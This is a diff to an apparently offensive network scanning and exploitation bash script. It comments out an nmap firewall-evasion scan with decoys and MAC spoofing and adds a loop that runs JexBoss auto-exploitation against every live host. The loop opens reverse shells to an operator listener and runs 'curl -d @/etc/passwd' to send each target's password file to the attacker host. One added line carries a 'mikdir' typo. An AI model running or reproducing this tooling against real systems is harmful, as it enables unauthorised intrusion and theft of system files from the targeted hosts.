@@ -19,6 +19,7 @@ wrkpth="$pth/$TodaysYEAR/$TodaysDAY"
 mkdir -p  $wrkpth/Halberd/ $wrkpth/Sublist3r/ $wrkpth/Harvester $wrkpth/Metagoofil
 mkdir -p $wrkpth/Nikto/ $wrkpth/Dirb/ $wrkpth/Nmap/ $wrkpth/Sniper/
 mkdir -p $wrkpth/Masscan/ $wrkpth/Arachni/ $wrkpth/TestSSL/ $wrkpth/SSLScan/
+mikdir -p $wrkpth/JexBoss
 
 # Moving back to original workspace & loading logo
 cd $pth
@@ -205,7 +206,7 @@ echo
 # Nmap - Firewall evasion
 echo
 echo "Firewall evasion scan -- You know just in case ;)"
-nmap -f -D RND:10 --badsum --data-length 24 --mtu 24 --spoof-mac Dell --randomize-hosts -A -F -Pn -R -sS -sU -sV --script=vulners -iL $pth/FinalTargets -oA $wrkpth/Nmap/FW_Evade
+# nmap -D RND:10 --badsum --data-length 24 --mtu 24 --spoof-mac Dell --randomize-hosts -A -F -Pn -R -sS -sU -sV --script=vulners -iL $pth/FinalTargets -oA $wrkpth/Nmap/FW_Evade
 xsltproc $wrkpth/Nmap/FW_Evade.xml -o $wrkpth/Nmap/FW_Evade.html
 echo
 
@@ -281,6 +282,35 @@ for IP in $(cat $pth/FinalTargets);do
         fi
     done
 done
+
+# Perform targeted scan using jexboss
+cd /opt/jexboss/
+echo
+echo "This is the part where you turn on netcat (e.g., nc -l -p 443)"
+echo
+echo "What is the reverse host (your machine IP address)?"
+read RHOST
+echo "What is the reverse port (listening port)?"
+read RPORT
+echo
+for IP in $(cat $wrkpth/Nmap/livehosts)
+do
+	for PORTNUM in ${PORT[*]}
+	do
+		STAT1=$(cat $wrkpth/Nmap/TCPdetails.gnmap | grep $IP | grep "Status: Up" -m 1 -o | cut -c 9-10)
+		STAT2=$(cat $wrkpth/Nmap/TCPdetails.gnmap | grep $IP | grep "$PORTNUM/open" -m 1 -o | grep "open" -o)
+		STAT3=$(cat $wrkpth/Nmap/TCPdetails.gnmap | grep $IP | grep "$PORTNUM/filtered" -m 1 -o | grep "filtered" -o)
+		if [ "$STAT1" == "Up" ] && [ "$STAT2" == "open" ] || [ "$STAT3" == "filtered" ];then
+			if [ "$PORTNUM" == "443" ];then
+				python jexboss.py -u https://$IP | tee -a "$wrkpth/JexBoss/Logs/$IP-$PORTNUM"
+			fi
+			python jexboss.py -u http://$IP:$PORTNUM -A --reverse-host $RHOST:$RPORT -x "curl -d @/etc/passwd $RHOST:$RPORT" | tee -a "$wrkpth/JexBoss/$IP-$PORTNUM"
+			echo >> $wrkpth/JexBoss/$IP-$PORTNUM
+			python jexboss.py -u https://$IP:$PORTNUM -A --reverse-host $RHOST:$RPORT -x "curl -d @/etc/passwd $RHOST:$RPORT" | tee -a "$wrkpth/JexBoss/$IP-$PORTNUM"
+		fi
+	done
+done
+cp /tmp/jexboss/jexboss_$TodaysYEAR-$TodaysDAY.log $wrkpth/JexBoss/
 
 # Using sniper
 echo "--------------------------------------------------"
